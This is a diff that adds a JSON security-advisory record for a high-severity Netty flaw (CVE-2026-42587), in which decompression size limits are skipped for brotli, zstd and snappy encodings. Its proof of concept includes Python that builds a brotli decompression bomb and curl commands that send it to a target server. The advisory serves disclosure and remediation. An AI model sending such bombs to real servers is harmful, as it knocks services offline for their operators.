@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-07T00:46:36Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-http2"
+  },
+  "Advisory": {
+    "DatabaseId": 353747,
+    "Id": "GSA_kwCzR0hTQS1mNmh2LWptcDYtM3Z3ds4ABWXT",
+    "GhsaId": "GHSA-f6hv-jmp6-3vwv",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-f6hv-jmp6-3vwv"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-f6hv-jmp6-3vwv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-f6hv-jmp6-3vwv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42587"
+      }
+    ],
+    "Description": "## Summary\n\n`HttpContentDecompressor` accepts a `maxAllocation` parameter to limit decompression buffer size and prevent decompression bomb attacks. This limit is correctly enforced for gzip and deflate encodings via `ZlibDecoder`, but is silently ignored when the content encoding is `br` (Brotli), `zstd`, or `snappy`. An attacker can bypass the configured decompression limit by sending a compressed payload with `Content-Encoding: br` instead of `Content-Encoding: gzip`, causing unbounded memory allocation and out-of-memory denial of service.\n\nThe same vulnerability exists in `DelegatingDecompressorFrameListener` for HTTP/2 connections.\n\n## Details\n\n`HttpContentDecompressor` stores the `maxAllocation` value at construction time (`HttpContentDecompressor.java:89`) and uses it in `newContentDecoder()` to create the appropriate decompression handler.\n\nFor gzip/deflate, `maxAllocation` is forwarded to `ZlibCodecFactory.newZlibDecoder()`:\n\n```java\n// HttpContentDecompressor.java:101 — maxAllocation IS enforced\n.handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP, maxAllocation))\n```\n\n`ZlibDecoder.prepareDecompressBuffer()` enforces this as a hard cap by setting the buffer's `maxCapacity` and throwing `DecompressionException` when the limit is reached:\n\n```java\n// ZlibDecoder.java:68 — hard limit on buffer capacity\nreturn ctx.alloc().heapBuffer(Math.min(preferredSize, maxAllocation), maxAllocation);\n// ZlibDecoder.java:80 — throws when exceeded\nthrow new DecompressionException(\"Decompression buffer has reached maximum size: \" + buffer.maxCapacity());\n```\n\nFor brotli, zstd, and snappy, the decoders are created without any size limit:\n\n```java\n// HttpContentDecompressor.java:120 — maxAllocation IGNORED\n.handlers(new BrotliDecoder())\n\n// HttpContentDecompressor.java:129 — maxAllocation IGNORED\n.handlers(new SnappyFrameDecoder())\n\n// HttpContentDecompressor.java:138 — maxAllocation IGNORED\n.handlers(new ZstdDecoder())\n```\n\n`BrotliDecoder` has no `maxAllocation` parameter at all — there is no way to constrain its output. It streams decompressed data in chunks via `fireChannelRead` with no total limit.\n\n`ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`, but this only constrains individual buffer allocations, not total output. The decode loop (`ZstdDecoder.java:100-114`) creates new buffers and fires `channelRead` repeatedly, so total decompressed output is unbounded.\n\nThe identical pattern exists in `DelegatingDecompressorFrameListener.newContentDecompressor()` at lines 188-210 for HTTP/2.\n\n## PoC\n\n1. Configure a Netty HTTP server with decompression bomb protection:\n\n```java\npipeline.addLast(new HttpContentDecompressor(1048576)); // 1MB max\npipeline.addLast(new HttpObjectAggregator(1048576));     // 1MB max\n```\n\n2. Generate a brotli-compressed bomb (~1KB compressed → 1GB decompressed):\n\n```python\nimport brotli\nbomb = b'\\x00' * (1024 * 1024 * 1024)  # 1GB of zeros\ncompressed = brotli.compress(bomb, quality=11)\nwith open('bomb.br', 'wb') as f:\n    f.write(compressed)\n# compressed size: ~1KB\n```\n\n3. Send the bomb with gzip encoding (BLOCKED by maxAllocation):\n\n```bash\n# This is caught — ZlibDecoder enforces the 1MB limit\ncurl -X POST http://target:8080/api \\\n  -H 'Content-Encoding: gzip' \\\n  --data-binary @bomb.gz\n# Result: DecompressionException thrown at 1MB\n```\n\n4. Send the same bomb with brotli encoding (BYPASSES maxAllocation):\n\n```bash\n# This bypasses the limit — BrotliDecoder has no maxAllocation\ncurl -X POST http://target:8080/api \\\n  -H 'Content-Encoding: br' \\\n  --data-binary @bomb.br\n# Result: Full 1GB decompressed into memory → OOM\n```\n\n5. The same bypass works with `Content-Encoding: zstd` and `Content-Encoding: snappy`.\n\n## Impact\n\n- **Denial of Service**: An attacker can cause out-of-memory conditions on any Netty server that relies on `maxAllocation` for decompression bomb protection, by simply using a non-gzip content encoding.\n- **False sense of security**: Developers who explicitly configure `maxAllocation` to protect against decompression bombs are not actually protected for brotli, zstd, or snappy encodings. The API documentation implies all encodings are covered.\n- **Trivial bypass**: The attacker only needs to change one HTTP header (`Content-Encoding: br` instead of `Content-Encoding: gzip`) to circumvent the protection entirely.\n- **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in both `HttpContentDecompressor` (HTTP/1.1) and `DelegatingDecompressorFrameListener` (HTTP/2).\n\n## Recommended Fix\n\nPass `maxAllocation` to all decoder constructors. For `BrotliDecoder`, which currently has no `maxAllocation` support, add the parameter:\n\n**HttpContentDecompressor.java** — pass maxAllocation to all decoders:\n\n```java\n// Line 120: BrotliDecoder — add maxAllocation support\n.handlers(new BrotliDecoder(maxAllocation))\n\n// Line 129: SnappyFrameDecoder — add maxAllocation support\n.handlers(new SnappyFrameDecoder(maxAllocation))\n\n// Line 138: ZstdDecoder — forward the configured maxAllocation\n.handlers(new ZstdDecoder(maxAllocation))\n```\n\n**DelegatingDecompressorFrameListener.java** — same fix at lines 188-210.\n\n**BrotliDecoder** — add `maxAllocation` parameter with the same semantics as `ZlibDecoder.prepareDecompressBuffer()`: set buffer maxCapacity and throw `DecompressionException` when the total decompressed output exceeds the limit.\n\n**SnappyFrameDecoder** — add `maxAllocation` parameter with equivalent enforcement.\n\n**ZstdDecoder** — ensure that when `maxAllocation` is set, total output across all buffers is bounded (not just per-buffer allocation size).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-07T00:46:35Z",
+    "Severity": "HIGH",
+    "Summary": "Netty: HttpContentDecompressor maxAllocation bypass when Content-Encoding set to br/zstd/snappy leads to decompression bomb DoS",
+    "UpdatedAt": "2026-05-07T00:46:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.1.133.Final"
+      },
+      "VulnerableVersionRange": "\u003c= 4.1.132.Final"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.13.Final"
+      },
+      "VulnerableVersionRange": "\u003e= 4.2.0.Alpha1, \u003c= 4.2.12.Final"
+    }
+  ]
+}
